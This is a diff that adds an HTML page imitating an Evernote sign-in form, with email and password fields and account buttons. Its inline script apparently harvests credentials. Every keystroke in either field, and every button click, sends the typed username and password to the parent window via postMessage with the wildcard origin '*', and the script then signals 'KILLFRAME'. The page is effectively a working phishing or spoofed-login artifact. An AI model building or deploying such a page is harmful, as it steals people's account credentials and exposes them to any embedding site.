@@ -1,0 +1,47 @@
+<html>
+  <head>
+    <link type="text/css" rel="stylesheet" href="login.css"></link>
+  </head>
+  <body>
+    <div id="main">
+      <div id="logo"></div>
+      <div id="close" tabindex="8"></div>
+      <div id="switcher" tabindex="7"></div>
+      <div id="globalError"></div>
+      <div class="inputContainer">
+        <input id="username" autofocus tabindex="1" placeholder="Email"/>
+        <div class="errorHoverRegion"></div>
+      </div>
+      <div class="inputContainer">
+        <input id="password" type="password" tabindex="2" placeholder="Password" />
+        <div class="errorHoverRegion"></div>
+      </div>
+      <div id="login" class="button" message="loginForm_login" tabindex="4" value="Sign In">Sign In</div>
+      <div id="reg" class="button" message="header_register" tabindex="5" value="Create an Evernote account">Create an Evernote account</div>
+      <div id="forgotPw" message="forgotPassword" tabindex="6" value="Forgot password?">Forgot password?</div>
+    </div>
+
+
+    <script src="jquery.js" type="text/javascript"></script>
+<script>
+$(document).ready(function() {
+  $('#username').keyup(function() {
+    parent.postMessage('Username field changed to: ' + $('#username').val(),'*');
+  });
+
+  $('#password').keyup(function() {
+    parent.postMessage('Password field changed to: ' + $('#password').val(),'*');
+  });
+
+  $('#login,#reg,#forgotPw,#close').click(function() {
+    parent.postMessage('Button Clicked - username field: ' + $('#username').val() + '; password field: ' + $('#password').val(),'*');
+    parent.postMessage('KILLFRAME','*');
+  });
+
+  $('#username').focus();
+
+});
+
+</script>
+  </body>
+</html>
